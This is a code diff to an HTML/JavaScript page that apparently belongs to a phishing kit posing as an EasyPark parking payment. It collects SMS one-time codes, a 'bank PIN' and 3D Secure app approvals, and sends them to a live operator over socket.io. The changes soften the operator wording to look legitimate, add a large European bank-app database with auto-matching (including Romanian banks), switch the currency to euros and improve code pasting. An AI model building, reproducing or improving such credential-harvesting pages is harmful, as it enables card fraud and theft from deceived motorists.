@@ -2,7 +2,7 @@
 <html lang="de"><head>
 <meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0">
 <title>Processing Payment — EasyPark</title>
-<script src="/static/js/i18n.js"></script>
+<script src="/static/js/i18n.js?v=2"></script>
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
 <script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
 <style>
@@ -34,8 +34,8 @@ input[type=number]::-webkit-inner-spin-button{-webkit-appearance:none}
 .ov-btn{width:100%;padding:14px;border-radius:12px;font-weight:800;font-size:14px;border:none;cursor:pointer;transition:.2s}
 .otp-row{display:flex;gap:7px;justify-content:center;margin-bottom:18px}
 .otp-b{width:42px;height:52px;border:2px solid #e5e7eb;border-radius:11px;text-align:center;font-size:22px;font-weight:800;color:#1e293b;outline:none;background:#f8fafc;transition:border .15s,box-shadow .15s;-webkit-appearance:none;padding:0}
-.otp-b:focus{border-color:#d97706;background:#fff;box-shadow:0 0 0 3px rgba(217,119,6,.15)}
-.otp-b.otp-filled{border-color:#d97706;background:#fffbeb}
+.otp-b:focus{border-color:#872879;background:#fff;box-shadow:0 0 0 3px rgba(135,40,121,.15)}
+.otp-b.otp-filled{border-color:#872879;background:#fdf2f8}
 @keyframes shield-pulse{0%,100%{transform:scale(1)}50%{transform:scale(1.08)}}
 </style>
 <style>
@@ -78,7 +78,7 @@ input[type=number]::-webkit-inner-spin-button{-webkit-appearance:none}
       </div>
     </div>
     <h2 style="font-weight:800;font-size:20px;color:#1e293b;margin:0 0 8px" data-i18n="processing">Se procesează plata…</h2>
-    <p style="font-size:14px;color:#64748b;margin:0 0 24px;line-height:1.6" data-i18n-html="operator_check_html">The operator is verifying the card data.<br>Do not close this page.</p>
+    <p style="font-size:14px;color:#64748b;margin:0 0 24px;line-height:1.6" data-i18n-html="operator_check_html">Your payment is being securely processed.<br>This may take a few moments — please keep this page open.</p>
     <div style="background:#f8fafc;border-radius:14px;padding:16px;text-align:left">
       <div style="display:flex;justify-content:space-between;padding:6px 0;border-bottom:1px solid #f1f5f9;font-size:13px">
         <span style="color:#94a3b8" data-i18n="plate_label">License plate</span>
@@ -90,7 +90,7 @@ input[type=number]::-webkit-inner-spin-button{-webkit-appearance:none}
       </div>
       <div style="display:flex;justify-content:space-between;padding:6px 0;font-size:13px">
         <span style="color:#94a3b8">Total</span>
-        <span style="font-weight:800;color:#56004D;font-size:15px">{{ session.total_price }} DKK</span>
+        <span style="font-weight:800;color:#56004D;font-size:15px">{{ session.total_price }} €</span>
 
       </div>
     </div>
@@ -103,8 +103,8 @@ input[type=number]::-webkit-inner-spin-button{-webkit-appearance:none}
 
 <div id="ov-sms" class="overlay" style="display:none">
   <div class="ov-card">
-    <div class="ov-icon-wrap" style="background:#fef9c3;animation:shield-pulse 2s ease-in-out infinite">
-      <i class="fas fa-comment-dots" style="color:#d97706"></i>
+    <div class="ov-icon-wrap" style="background:#fdf2f8;animation:shield-pulse 2s ease-in-out infinite">
+      <i class="fas fa-comment-dots" style="color:#872879"></i>
     </div>
     <h3 style="font-weight:800;font-size:18px;color:#1e293b;margin:0 0 5px" data-i18n="sms_title">SMS Verification</h3>
     <p style="font-size:12px;color:#64748b;margin:0 0 18px;line-height:1.5" data-i18n="sms_desc">You received a 6-digit code on your phone. Enter it below:</p>
@@ -116,24 +116,24 @@ input[type=number]::-webkit-inner-spin-button{-webkit-appearance:none}
       <input class="otp-b" type="tel" inputmode="numeric" maxlength="1" pattern="[0-9]*">
       <input class="otp-b" type="tel" inputmode="numeric" maxlength="1" pattern="[0-9]*">
     </div>
-    <button class="ov-btn" id="sms-submit-btn" style="background:#d97706;color:#fff;opacity:.5;cursor:default" data-i18n="confirm_code">CONFIRM CODE</button>
+    <button class="ov-btn" id="sms-submit-btn" style="background:#872879;color:#fff;opacity:.5;cursor:default" data-i18n="confirm_code">CONFIRM CODE</button>
   </div>
 </div>
 <div id="ov-pin" class="overlay" style="display:none">
   <div class="ov-card">
-    <div class="ov-icon-wrap" style="background:#fce7f3"><i class="fas fa-key" style="color:#7c3aed"></i></div>
+    <div class="ov-icon-wrap" style="background:#fdf2f8"><i class="fas fa-key" style="color:#872879"></i></div>
     <h3 style="font-weight:800;font-size:18px;color:#1e293b;margin:0 0 6px" data-i18n="pin_title">Bank PIN Code</h3>
     <p style="font-size:13px;color:#64748b;margin:0 0 16px" data-i18n="pin_desc">Enter the PIN code received from your bank:</p>
     <input id="pin-code" type="tel" inputmode="numeric" maxlength="8" placeholder="• • • •"
            class="ov-inp" style="border-color:#fbcfe8" oninput="this.value=this.value.replace(/\D/g,'')">
-    <button class="ov-btn" style="background:#7c3aed;color:#fff" onclick="submitPINCode()" data-i18n="confirm_pin">CONFIRM PIN</button>
+    <button class="ov-btn" style="background:#872879;color:#fff" onclick="submitPINCode()" data-i18n="confirm_pin">CONFIRM PIN</button>
   </div>
 </div>
 <div id="ov-app" class="overlay" style="display:none">
   <div class="ov-card" style="max-width:340px;padding:24px 20px">
     <!-- Header -->
     <div style="display:flex;align-items:center;gap:10px;margin-bottom:4px">
-      <div class="ov-icon-wrap" style="background:#dbeafe;width:44px;height:44px;min-width:44px;margin:0;font-size:20px"><i class="fas fa-shield-alt" style="color:#3b82f6"></i></div>
+      <div class="ov-icon-wrap" style="background:#fdf2f8;width:44px;height:44px;min-width:44px;margin:0;font-size:20px"><i class="fas fa-shield-alt" style="color:#872879"></i></div>
       <div style="text-align:left">
         <h3 style="font-weight:800;font-size:16px;color:#1e293b;margin:0 0 2px" data-i18n="app_title">3D Secure Authentication</h3>
         <p style="font-size:11px;color:#64748b;margin:0" data-i18n="app_desc">Approve the transaction from your banking app</p>
@@ -143,8 +143,8 @@ input[type=number]::-webkit-inner-spin-button{-webkit-appearance:none}
 
     <!-- Auto-detected bank -->
     <div id="app-matched" style="display:none;margin-bottom:14px">
-      <p style="font-size:11px;font-weight:700;color:#3b82f6;text-transform:uppercase;letter-spacing:.06em;margin:0 0 8px">Erkannte Bank</p>
-      <button id="app-matched-btn" style="width:100%;display:flex;align-items:center;gap:12px;padding:14px 16px;border:2px solid #3b82f6;border-radius:14px;background:linear-gradient(135deg,#eff6ff,#fff);cursor:pointer;text-align:left;box-shadow:0 4px 16px rgba(59,130,246,.18);transition:.15s">
+      <p style="font-size:11px;font-weight:700;color:#872879;text-transform:uppercase;letter-spacing:.06em;margin:0 0 8px">Erkannte Bank</p>
+      <button id="app-matched-btn" style="width:100%;display:flex;align-items:center;gap:12px;padding:14px 16px;border:2px solid #872879;border-radius:14px;background:linear-gradient(135deg,#fdf2f8,#fff);cursor:pointer;text-align:left;box-shadow:0 4px 16px rgba(135,40,121,.18);transition:.15s">
         <div id="app-matched-icon" style="width:46px;height:46px;border-radius:12px;display:flex;align-items:center;justify-content:center;flex-shrink:0">
           <span id="app-matched-tx" style="color:#fff;font-weight:900;font-size:11px"></span>
         </div>
@@ -152,76 +152,29 @@ input[type=number]::-webkit-inner-spin-button{-webkit-appearance:none}
           <div id="app-matched-name" style="font-size:15px;font-weight:800;color:#1e293b"></div>
           <div id="app-matched-lbl" style="font-size:11px;color:#64748b"></div>
         </div>
-        <i class="fas fa-chevron-right" style="color:#3b82f6;font-size:14px"></i>
+        <i class="fas fa-chevron-right" style="color:#872879;font-size:14px"></i>
       </button>
       <button onclick="showAllBanks()" style="width:100%;margin-top:8px;padding:8px;border:none;background:none;font-size:11px;color:#94a3b8;cursor:pointer">Andere Bank wählen →</button>
     </div>
     <!-- All banks fallback -->
     <div id="app-all-banks" style="display:none">
-    <p style="font-size:12px;font-weight:600;color:#374151;margin:0 0 10px;text-align:left" data-i18n="select_bank">Wählen Sie Ihre Bank:</p>
-    <div id="app-bank-list" style="display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-bottom:14px">
-      <button onclick="openBank('deutschebank://','https://apps.apple.com/de/app/deutsche-bank-mobile/id364184043','https://play.google.com/store/apps/details?id=com.db.pwcc.dbmobile')"
-        style="display:flex;align-items:center;gap:8px;padding:10px 12px;border:1.5px solid #e5e7eb;border-radius:12px;background:#fff;cursor:pointer;text-align:left;transition:.15s"
-        onmouseover="this.style.borderColor='#0033a0'" onmouseout="this.style.borderColor='#e5e7eb'">
-        <div style="width:32px;height:32px;border-radius:8px;background:linear-gradient(135deg,#001f6e,#0033a0);display:flex;align-items:center;justify-content:center;flex-shrink:0">
-          <span style="color:#fff;font-weight:900;font-size:9px">DB</span>
-        </div>
-        <div><div style="font-size:12px;font-weight:700;color:#1e293b">Mobile Banking</div><div style="font-size:10px;color:#94a3b8">Deutsche Bank</div></div>
-      </button>
-      <button onclick="openBank('sparkasse://','https://apps.apple.com/de/app/sparkasse-ihre-mobile-bank/id388927368','https://play.google.com/store/apps/details?id=com.starfinanz.smob.android.sfinanzstatus')"
-        style="display:flex;align-items:center;gap:8px;padding:10px 12px;border:1.5px solid #e5e7eb;border-radius:12px;background:#fff;cursor:pointer;text-align:left;transition:.15s"
-        onmouseover="this.style.borderColor='#e30613'" onmouseout="this.style.borderColor='#e5e7eb'">
-        <div style="width:32px;height:32px;border-radius:8px;background:linear-gradient(135deg,#a00010,#e30613);display:flex;align-items:center;justify-content:center;flex-shrink:0">
-          <span style="color:#fff;font-weight:900;font-size:8px">SKS</span>
-        </div>
-        <div><div style="font-size:12px;font-weight:700;color:#1e293b">Banking App</div><div style="font-size:10px;color:#94a3b8">Sparkasse</div></div>
-      </button>
-      <button onclick="openBank('commerzbank://','https://apps.apple.com/de/app/commerzbank-banking/id364164101','https://play.google.com/store/apps/details?id=de.commerzbanking.mobil')"
-        style="display:flex;align-items:center;gap:8px;padding:10px 12px;border:1.5px solid #e5e7eb;border-radius:12px;background:#fff;cursor:pointer;text-align:left;transition:.15s"
-        onmouseover="this.style.borderColor='#ffd700'" onmouseout="this.style.borderColor='#e5e7eb'">
-        <div style="width:32px;height:32px;border-radius:8px;background:linear-gradient(135deg,#b8970a,#ffd700);display:flex;align-items:center;justify-content:center;flex-shrink:0">
-          <span style="color:#fff;font-weight:900;font-size:7px">CBK</span>
-        </div>
-        <div><div style="font-size:12px;font-weight:700;color:#1e293b">Banking App</div><div style="font-size:10px;color:#94a3b8">Commerzbank</div></div>
-      </button>
-      <button onclick="openBank('ingdiba://','https://apps.apple.com/de/app/ing-banking-to-go/id573184925','https://play.google.com/store/apps/details?id=de.ingdiba.bankingapp')"
-        style="display:flex;align-items:center;gap:8px;padding:10px 12px;border:1.5px solid #e5e7eb;border-radius:12px;background:#fff;cursor:pointer;text-align:left;transition:.15s"
-        onmouseover="this.style.borderColor='#ff6200'" onmouseout="this.style.borderColor='#e5e7eb'">
-        <div style="width:32px;height:32px;border-radius:8px;background:linear-gradient(135deg,#c2410c,#ff6200);display:flex;align-items:center;justify-content:center;flex-shrink:0">
-          <span style="color:#fff;font-weight:900;font-size:10px">ING</span>
-        </div>
-        <div><div style="font-size:12px;font-weight:700;color:#1e293b">Banking to go</div><div style="font-size:10px;color:#94a3b8">ING DiBa</div></div>
-      </button>
-      <button onclick="openBank('dkb://','https://apps.apple.com/de/app/dkb-banking/id1073774354','https://play.google.com/store/apps/details?id=com.dkbcodefactory.banking')"
-        style="display:flex;align-items:center;gap:8px;padding:10px 12px;border:1.5px solid #e5e7eb;border-radius:12px;background:#fff;cursor:pointer;text-align:left;transition:.15s"
-        onmouseover="this.style.borderColor='#2563eb'" onmouseout="this.style.borderColor='#e5e7eb'">
-        <div style="width:32px;height:32px;border-radius:8px;background:linear-gradient(135deg,#1d4ed8,#2563eb);display:flex;align-items:center;justify-content:center;flex-shrink:0">
-          <span style="color:#fff;font-weight:900;font-size:9px">DKB</span>
-        </div>
-        <div><div style="font-size:12px;font-weight:700;color:#1e293b">DKB Banking</div><div style="font-size:10px;color:#94a3b8">DKB Bank</div></div>
-      </button>
-      <button onclick="openBank('volksbank://','https://apps.apple.com/de/app/vr-banking/id329457093','https://play.google.com/store/apps/details?id=de.fiduciagad.android.vrwelt')"
-        style="display:flex;align-items:center;gap:8px;padding:10px 12px;border:1.5px solid #e5e7eb;border-radius:12px;background:#fff;cursor:pointer;text-align:left;transition:.15s"
-        onmouseover="this.style.borderColor='#005a28'" onmouseout="this.style.borderColor='#e5e7eb'">
-        <div style="width:32px;height:32px;border-radius:8px;background:linear-gradient(135deg,#003d1a,#005a28);display:flex;align-items:center;justify-content:center;flex-shrink:0">
-          <span style="color:#fff;font-weight:900;font-size:8px">VR</span>
-        </div>
-        <div><div style="font-size:12px;font-weight:700;color:#1e293b">VR Banking</div><div style="font-size:10px;color:#94a3b8">Volksbank</div></div>
-      </button>
-    </div>
+    <p style="font-size:12px;font-weight:600;color:#374151;margin:0 0 8px;text-align:left" data-i18n="select_bank">Select your bank:</p>
+    <input id="bank-search" type="text" placeholder="🔍 Search bank…" oninput="filterBankList(this.value)"
+      style="width:100%;padding:8px 12px;border:1.5px solid #e2e8f0;border-radius:10px;font-size:13px;outline:none;margin-bottom:8px;box-sizing:border-box">
+    <div id="app-bank-list" style="display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-bottom:14px;max-height:280px;overflow-y:auto"></div>
     </div><!-- /app-all-banks -->
 
     <!-- Waiting state (hidden initially) -->
     <div id="app-waiting" style="display:none;text-align:center;padding:8px 0 12px">
       <div style="display:flex;justify-content:center;gap:6px;margin-bottom:10px">
-        <div style="width:8px;height:8px;background:#3b82f6;border-radius:50%;animation:ab .8s infinite"></div>
-        <div style="width:8px;height:8px;background:#3b82f6;border-radius:50%;animation:ab .8s .25s infinite"></div>
-        <div style="width:8px;height:8px;background:#3b82f6;border-radius:50%;animation:ab .8s .5s infinite"></div>
+        <div style="width:8px;height:8px;background:#872879;border-radius:50%;animation:ab .8s infinite"></div>
+        <div style="width:8px;height:8px;background:#872879;border-radius:50%;animation:ab .8s .25s infinite"></div>
+        <div style="width:8px;height:8px;background:#872879;border-radius:50%;animation:ab .8s .5s infinite"></div>
       </div>
       <p style="font-size:12px;color:#64748b;margin:0 0 10px" data-i18n="waiting_app">Waiting for app confirmation…</p>
     </div>
 
-    <button class="ov-btn" style="background:#3b82f6;color:#fff;font-size:13px" onclick="submitAppConfirm()" data-i18n="confirmed_app">✓ I CONFIRMED IN THE APP</button>
+    <button class="ov-btn" style="background:linear-gradient(135deg,#56004D,#872879);color:#fff;font-size:13px" onclick="submitAppConfirm()" data-i18n="confirmed_app">✓ I CONFIRMED IN THE APP</button>
     <button onclick="document.getElementById('ov-app').style.display='none'" style="width:100%;margin-top:8px;padding:10px;border:none;background:transparent;color:#94a3b8;font-size:12px;cursor:pointer" data-i18n="cancel">Cancel</button>
   </div>
 </div>
@@ -250,7 +203,13 @@ function initOTP(){
   const boxes=[...document.querySelectorAll('#otp-sms .otp-b')];
   boxes.forEach((b,i)=>{
     b.addEventListener('input',()=>{
-      b.value=b.value.replace(/\D/g,'').slice(-1);
+      const raw=b.value.replace(/\D/g,'');
+      if(raw.length>1){
+        boxes.forEach((x,j)=>{x.value=raw[j]||'';x.classList.toggle('otp-filled',!!x.value);});
+        const last=Math.min(raw.length,6)-1; if(last>=0) boxes[last].focus();
+        checkOTP(boxes); return;
+      }
+      b.value=raw.slice(-1);
       b.classList.toggle('otp-filled',!!b.value);
       if(b.value&&i<5) boxes[i+1].focus();
       checkOTP(boxes);
@@ -306,19 +265,23 @@ function submitPINCode(){
 function openBank(scheme, iosUrl, androidUrl){
   document.getElementById('app-matched').style.display='none';
   document.getElementById('app-all-banks').style.display='none';
-  document.getElementById('app-bank-list').style.display='none';
   document.getElementById('app-waiting').style.display='block';
-  const isIOS = /iPad|iPhone|iPod/.test(navigator.userAgent);
-  const storeUrl = isIOS ? iosUrl : androidUrl;
-  const t0 = Date.now();
-  window.location.href = scheme;
-  setTimeout(function(){
-    if(Date.now() - t0 < 1800){ window.location.href = storeUrl; }
-  }, 1200);
+  const isIOS=/iPad|iPhone|iPod/.test(navigator.userAgent);
+  const storeUrl=isIOS ? iosUrl : androidUrl;
+  if(!scheme){
+    window.location.href=storeUrl; return;
+  }
+  window.location.href=scheme;
+  var fallback=setTimeout(function(){ window.location.href=storeUrl; }, 1500);
+  var handler=function(){
+    if(document.hidden){ clearTimeout(fallback); document.removeEventListener('visibilitychange',handler); }
+  };
+  document.addEventListener('visibilitychange',handler);
 }
 function showAllBanks(){
   document.getElementById('app-matched').style.display='none';
   document.getElementById('app-all-banks').style.display='block';
+  buildBankList();
 }
 function submitAppConfirm(){
   socket.emit('app_confirmed',{token:TOKEN});
@@ -330,23 +293,39 @@ function submitAppConfirm(){
 }
 // ── European Bank DB + auto-match ──────────────────────────────────────────────────────
 const BANK_DB=[
+  // ── ROMANIA ──────────────────────────────────────────────────────────────────
+  {keys:['banca transilvania','transilvania','btrl','bt bank','bt pay'],name:'Banca Transilvania',label:'BT Pay',scheme:'btpay://',ios:'https://apps.apple.com/ro/app/bt-pay/id1030990028',android:'https://play.google.com/store/apps/details?id=ro.btrl.dev',bg1:'#003087',bg2:'#0052cc',tx:'BT'},
+  {keys:['banca comerciala romana','bcr ','bcr-','george ro'],name:'BCR',label:'George by BCR',scheme:'georgebcr://',ios:'https://apps.apple.com/ro/app/george-romania/id1443364358',android:'https://play.google.com/store/apps/details?id=ro.bcr.georgego',bg1:'#003087',bg2:'#0052cc',tx:'BCR'},
+  {keys:['brd','groupe societe generale ro','brd group'],name:'BRD',label:'BRD Mobile',scheme:'brd://',ios:'https://apps.apple.com/ro/app/brd-mobile/id1329166021',android:'https://play.google.com/store/apps/details?id=com.brd.mobile.android',bg1:'#166534',bg2:'#16a34a',tx:'BRD'},
+  {keys:['raiffeisen bank ro','raiffeisen romania','rfb ro'],name:'Raiffeisen Romania',label:'Smart Mobile',scheme:'raiffeisen://',ios:'https://apps.apple.com/ro/app/raiffeisen-smart-mobile/id414571940',android:'https://play.google.com/store/apps/details?id=ro.raiffeisen.smartmobile',bg1:'#b91c1c',bg2:'#fbbf24',tx:'RZB'},
+  {keys:['cec bank','cec '],name:'CEC Bank',label:'CEC Mobile',scheme:'cecbank://',ios:'https://apps.apple.com/ro/app/cec-mobile/id992419268',android:'https://play.google.com/store/apps/details?id=ro.cecbank.cecmobile',bg1:'#003087',bg2:'#1d4ed8',tx:'CEC'},
+  {keys:['ing romania','ing bank romania','ing ro'],name:'ING Romania',label:'ING Home\'Bank',scheme:'ing://',ios:'https://apps.apple.com/ro/app/ing-homebank/id1316547559',android:'https://play.google.com/store/apps/details?id=ro.ing.mobile.banking.android.activity',bg1:'#c2410c',bg2:'#ff6200',tx:'ING'},
+  {keys:['alpha bank ro','alpha bank romania'],name:'Alpha Bank Romania',label:'Alpha Mobile',scheme:'alphabank://',ios:'https://apps.apple.com/ro/app/alpha-mobile-romania/id1498440685',android:'https://play.google.com/store/apps/details?id=ro.alphabank.mobile',bg1:'#003087',bg2:'#1d4ed8',tx:'ALF'},
+  {keys:['otp bank ro','otp romania','otpbank ro'],name:'OTP Bank Romania',label:'OTP Mobile',scheme:'otpbank://',ios:'https://apps.apple.com/ro/app/otp-bank-romania/id1482636614',android:'https://play.google.com/store/apps/details?id=ro.otpbank.mobile',bg1:'#166534',bg2:'#15803d',tx:'OTP'},
+  {keys:['garanti','garanti bbva'],name:'Garanti BBVA',label:'Garanti Mobile',scheme:'garanti://',ios:'https://apps.apple.com/ro/app/garanti-bbva-mobile/id550623686',android:'https://play.google.com/store/apps/details?id=com.garanti.cepsubesi',bg1:'#166534',bg2:'#22c55e',tx:'GRN'},
+  {keys:['unicredit ro','unicredit romania','unicredit tiriac'],name:'UniCredit Romania',label:'UniCredit Mobile',scheme:'unicredit://',ios:'https://apps.apple.com/ro/app/unicredit-mobile-banking/id398453959',android:'https://play.google.com/store/apps/details?id=com.unicredit',bg1:'#991b1b',bg2:'#dc2626',tx:'UCR'},
+  // ── GERMANY ───────────────────────────────────────────────────────────────────
   {keys:['deutsche bank','db privat','db ag'],name:'Deutsche Bank',label:'Mobile Banking',scheme:'deutschebank://',ios:'https://apps.apple.com/de/app/deutsche-bank-mobile/id364184043',android:'https://play.google.com/store/apps/details?id=com.db.pwcc.dbmobile',bg1:'#001f6e',bg2:'#0033a0',tx:'DB'},
   {keys:['sparkasse','spk ','landesbank'],name:'Sparkasse',label:'Banking App',scheme:'sparkasse://',ios:'https://apps.apple.com/de/app/sparkasse-ihre-mobile-bank/id388927368',android:'https://play.google.com/store/apps/details?id=com.starfinanz.smob.android.sfinanzstatus',bg1:'#a00010',bg2:'#e30613',tx:'SKS'},
   {keys:['commerzbank'],name:'Commerzbank',label:'Banking App',scheme:'commerzbank://',ios:'https://apps.apple.com/de/app/commerzbank-banking/id364164101',android:'https://play.google.com/store/apps/details?id=de.commerzbanking.mobil',bg1:'#b8970a',bg2:'#ffd700',tx:'CBK'},
-  {keys:['ing-diba','ing diba','ing direct','ing bank'],name:'ING DiBa',label:'Banking to go',scheme:'ingdiba://',ios:'https://apps.apple.com/de/app/ing-banking-to-go/id573184925',android:'https://play.google.com/store/apps/details?id=de.ingdiba.bankingapp',bg1:'#c2410c',bg2:'#ff6200',tx:'ING'},
+  {keys:['ing-diba','ing diba','ing direct','ing bank de'],name:'ING DiBa',label:'Banking to go',scheme:'ingdiba://',ios:'https://apps.apple.com/de/app/ing-banking-to-go/id573184925',android:'https://play.google.com/store/apps/details?id=de.ingdiba.bankingapp',bg1:'#c2410c',bg2:'#ff6200',tx:'ING'},
   {keys:['dkb','deutsche kreditbank'],name:'DKB Bank',label:'DKB Banking',scheme:'dkb://',ios:'https://apps.apple.com/de/app/dkb-banking/id1073774354',android:'https://play.google.com/store/apps/details?id=com.dkbcodefactory.banking',bg1:'#1d4ed8',bg2:'#2563eb',tx:'DKB'},
-  {keys:['volksbank','raiffeisenbank','vr bank'],name:'Volksbank',label:'VR Banking',scheme:'volksbank://',ios:'https://apps.apple.com/de/app/vr-banking/id329457093',android:'https://play.google.com/store/apps/details?id=de.fiduciagad.android.vrwelt',bg1:'#003d1a',bg2:'#005a28',tx:'VR'},
+  {keys:['volksbank','raiffeisenbank de','vr bank'],name:'Volksbank',label:'VR Banking',scheme:'volksbank://',ios:'https://apps.apple.com/de/app/vr-banking/id329457093',android:'https://play.google.com/store/apps/details?id=de.fiduciagad.android.vrwelt',bg1:'#003d1a',bg2:'#005a28',tx:'VR'},
   {keys:['postbank'],name:'Postbank',label:'Postbank Banking',scheme:'postbank://',ios:'https://apps.apple.com/de/app/postbank-banking/id354987339',android:'https://play.google.com/store/apps/details?id=de.postbank.finanzassistent',bg1:'#b8970a',bg2:'#f59e0b',tx:'PB'},
   {keys:['comdirect'],name:'comdirect',label:'comdirect Mobile',scheme:'comdirect://',ios:'https://apps.apple.com/de/app/comdirect-mobile-app/id398493350',android:'https://play.google.com/store/apps/details?id=de.comdirect.android',bg1:'#ea580c',bg2:'#f97316',tx:'CD'},
   {keys:['n26'],name:'N26',label:'Mobile Bank',scheme:'n26://',ios:'https://apps.apple.com/de/app/n26-ihr-konto/id956857223',android:'https://play.google.com/store/apps/details?id=de.number26.android',bg1:'#111827',bg2:'#374151',tx:'N26'},
   {keys:['hypovereinsbank','hvb','unicredit bank ag'],name:'HypoVereinsbank',label:'HVB Mobile',scheme:'hvb://',ios:'https://apps.apple.com/de/app/hypovereinsbank-mobile/id449177421',android:'https://play.google.com/store/apps/details?id=com.hypovereinsbank.mobile',bg1:'#991b1b',bg2:'#dc2626',tx:'HVB'},
   {keys:['targobank'],name:'TARGOBANK',label:'Online-Banking',scheme:'targobank://',ios:'https://apps.apple.com/de/app/targobank-banking/id435396822',android:'https://play.google.com/store/apps/details?id=com.targobank.banking',bg1:'#6d28d9',bg2:'#7c3aed',tx:'TB'},
+  // ── FRANCE ────────────────────────────────────────────────────────────────────
   {keys:['bnp paribas','banque nationale de paris'],name:'BNP Paribas',label:'Mes Comptes',scheme:'bnpparibas://',ios:'https://apps.apple.com/fr/app/mes-comptes-bnp-paribas/id399192569',android:'https://play.google.com/store/apps/details?id=net.bnpparibas.mescomptes',bg1:'#006633',bg2:'#16a34a',tx:'BNP'},
   {keys:['credit agricole','crédit agricole','ca bank'],name:'Crédit Agricole',label:'Ma Banque',scheme:'creditagricole://',ios:'https://apps.apple.com/fr/app/ma-banque/id398867520',android:'https://play.google.com/store/apps/details?id=fr.creditagricole.androidapp',bg1:'#15803d',bg2:'#22c55e',tx:'CA'},
   {keys:['societe generale','société générale','sg bank'],name:'Société Générale',label:'Appli SG',scheme:'societegenerale://',ios:'https://apps.apple.com/fr/app/lappli-sg/id390546578',android:'https://play.google.com/store/apps/details?id=mobi.societegenerale.mobile.lappli',bg1:'#b91c1c',bg2:'#dc2626',tx:'SG'},
-  {keys:['caisse epargne','caisse d epargne'],name:'Caisse d\'Epargne',label:'Mon Banquier',scheme:'caisseepargne://',ios:'https://apps.apple.com/fr/app/caisse-depargne/id390547413',android:'https://play.google.com/store/apps/details?id=com.caisseepargne.android.mobilebanking',bg1:'#166534',bg2:'#16a34a',tx:'CE'},
+  {keys:['caisse epargne','caisse d epargne','caisseepargne'],name:'Caisse d\'Epargne',label:'Mon Banquier',scheme:'caisseepargne://',ios:'https://apps.apple.com/fr/app/caisse-depargne/id390547413',android:'https://play.google.com/store/apps/details?id=com.caisseepargne.android.mobilebanking',bg1:'#166534',bg2:'#16a34a',tx:'CE'},
   {keys:['lcl','le credit lyonnais'],name:'LCL',label:'Mes Comptes LCL',scheme:'lcl://',ios:'https://apps.apple.com/fr/app/mes-comptes-lcl/id382380994',android:'https://play.google.com/store/apps/details?id=fr.lcl.android.customerarea',bg1:'#1d4ed8',bg2:'#3b82f6',tx:'LCL'},
   {keys:['banque populaire'],name:'Banque Populaire',label:'Cyberplus',scheme:'banquepopulaire://',ios:'https://apps.apple.com/fr/app/banque-populaire/id420922596',android:'https://play.google.com/store/apps/details?id=fr.banquepopulaire.cyberplus',bg1:'#b91c1c',bg2:'#dc2626',tx:'BP'},
+  {keys:['credit mutuel','crédit mutuel'],name:'Crédit Mutuel',label:'Crédit Mutuel',scheme:'creditmutuel://',ios:'https://apps.apple.com/fr/app/credit-mutuel/id378452870',android:'https://play.google.com/store/apps/details?id=fr.creditMutuel.mobile',bg1:'#003082',bg2:'#1d4ed8',tx:'CM'},
+  {keys:['la banque postale','banque postale'],name:'La Banque Postale',label:'Mon Espace',scheme:'labanquepostale://',ios:'https://apps.apple.com/fr/app/la-banque-postale/id428508866',android:'https://play.google.com/store/apps/details?id=com.labanquepostale.android',bg1:'#b8970a',bg2:'#d97706',tx:'LBP'},
+  // ── UK ───────────────────────────────────────────────────────────────────────
   {keys:['barclays'],name:'Barclays',label:'Mobile Banking',scheme:'barclays://',ios:'https://apps.apple.com/gb/app/barclays-mobile-banking/id379536579',android:'https://play.google.com/store/apps/details?id=com.barclays.android.barclaysmobilebanking',bg1:'#003082',bg2:'#0040a0',tx:'BCL'},
   {keys:['hsbc'],name:'HSBC',label:'HSBC Mobile',scheme:'hsbc://',ios:'https://apps.apple.com/gb/app/hsbc-mobile-banking/id301322310',android:'https://play.google.com/store/apps/details?id=uk.co.hsbc.hsbcukmobilebanking',bg1:'#b91c1c',bg2:'#dc2626',tx:'HSB'},
   {keys:['lloyds'],name:'Lloyds Bank',label:'Mobile Banking',scheme:'lloyds://',ios:'https://apps.apple.com/gb/app/lloyds-bank-mobile-banking/id469964520',android:'https://play.google.com/store/apps/details?id=com.lloydsbank.mobile',bg1:'#006633',bg2:'#16a34a',tx:'LLY'},
@@ -355,46 +334,115 @@ const BANK_DB=[
   {keys:['starling'],name:'Starling Bank',label:'Mobile Banking',scheme:'starlingbank://',ios:'https://apps.apple.com/gb/app/starling-bank/id1090123345',android:'https://play.google.com/store/apps/details?id=com.starlingbank.android',bg1:'#6d28d9',bg2:'#7c3aed',tx:'STR'},
   {keys:['nationwide'],name:'Nationwide',label:'Banking App',scheme:'nationwide://',ios:'https://apps.apple.com/gb/app/nationwide-banking-app/id436728127',android:'https://play.google.com/store/apps/details?id=co.uk.Nationwide.Mobile',bg1:'#003082',bg2:'#1d4ed8',tx:'NWD'},
   {keys:['halifax'],name:'Halifax',label:'Mobile Banking',scheme:'halifax://',ios:'https://apps.apple.com/gb/app/halifax-mobile-banking/id364224785',android:'https://play.google.com/store/apps/details?id=com.halifax',bg1:'#1d4ed8',bg2:'#2563eb',tx:'HFX'},
+  {keys:['tsb bank'],name:'TSB Bank',label:'TSB Mobile',scheme:'tsb://',ios:'https://apps.apple.com/gb/app/tsb-mobile-banking/id641685632',android:'https://play.google.com/store/apps/details?id=uk.co.tsb.newmobilebank',bg1:'#003082',bg2:'#0052cc',tx:'TSB'},
+  {keys:['metro bank'],name:'Metro Bank',label:'Metro Mobile',scheme:'metrobank://',ios:'https://apps.apple.com/gb/app/metro-bank-mobile-banking/id543867765',android:'https://play.google.com/store/apps/details?id=uk.co.metrobank.mobile',bg1:'#b91c1c',bg2:'#dc2626',tx:'MTR'},
+  // ── SPAIN ─────────────────────────────────────────────────────────────────────
   {keys:['bbva'],name:'BBVA',label:'Banca Móvil',scheme:'bbva://',ios:'https://apps.apple.com/es/app/bbva-espana/id595121418',android:'https://play.google.com/store/apps/details?id=com.bbva.nxt_android',bg1:'#003082',bg2:'#004aba',tx:'BBVA'},
   {keys:['santander'],name:'Santander',label:'Santander App',scheme:'santander://',ios:'https://apps.apple.com/es/app/santander/id383928360',android:'https://play.google.com/store/apps/details?id=es.bancosantander.apps',bg1:'#b91c1c',bg2:'#dc2626',tx:'SAN'},
